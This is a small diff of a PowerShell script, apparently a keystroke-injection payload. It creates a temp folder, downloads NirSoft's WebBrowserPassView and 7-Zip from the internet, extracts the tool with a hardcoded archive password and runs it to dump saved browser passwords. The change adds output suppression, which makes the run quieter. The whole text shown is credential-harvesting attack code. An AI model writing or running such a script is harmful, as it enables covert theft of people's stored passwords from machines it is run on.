@@ -6,7 +6,7 @@ $wshell = New-Object -ComObject wscript.shell;
 mkdir \temp
 cd \temp
 iwr -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip | Out-Null
-iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip | Out-Null
 Expand-Archive 7z.zip | Out-Null
 .\7z\7za.exe e wbpv.zip -pwbpv28821@ -y | Out-Null
 .\WebBrowserPassView.exe
